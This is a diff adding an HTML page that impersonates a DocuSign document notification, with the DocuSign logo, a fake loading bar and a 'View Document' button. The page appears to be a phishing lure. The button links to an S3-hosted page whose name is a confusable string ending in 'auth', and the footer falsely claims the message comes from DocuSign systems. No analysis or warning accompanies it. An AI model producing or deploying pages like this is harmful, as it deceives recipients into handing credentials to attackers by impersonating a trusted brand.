@@ -1,0 +1,73 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Document Notification - DocuSign</title>
+  <style>
+    body {
+      background-color: #f8f9fa;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 80px;
+    }
+    .logo {
+      width: 200px;
+      margin-bottom: 40px;
+    }
+    .loader {
+      width: 40%;
+      height: 10px;
+      background: #e0e0e0;
+      margin: 0 auto 30px;
+      border-radius: 5px;
+      overflow: hidden;
+      position: relative;
+    }
+    .bar {
+      height: 100%;
+      width: 100%;
+      background: #0072ce;
+      animation: loading 2s linear forwards;
+    }
+    @keyframes loading {
+      from { width: 0%; }
+      to { width: 100%; }
+    }
+    .cta-button {
+      display: inline-block;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #ffffff;
+      background-color: #0072ce;
+      text-decoration: none;
+      border-radius: 4px;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <img class="logo" src="https://brandlogos.net/wp-content/uploads/2024/04/docusign-logo_brandlogos.net_5wujv.png" alt="DocuSign Logo" />
+
+  <div class="loader">
+    <div class="bar"></div>
+  </div>
+
+  <p>Your document is ready. Click the button below to view:</p>
+
+  <p>
+    <a href="https://00000000000llllluauth.s3.us-west-2.amazonaws.com/index.html" class="cta-button" target="_blank" rel="noopener">View Document</a>
+  </p>
+
+  <div class="footer">
+    <p>This message was generated automatically by DocuSign systems.</p>
+    <p>Do not reply to this email. If you believe this message was sent in error, please contact your administrator.</p>
+  </div>
+</body>
+</html>
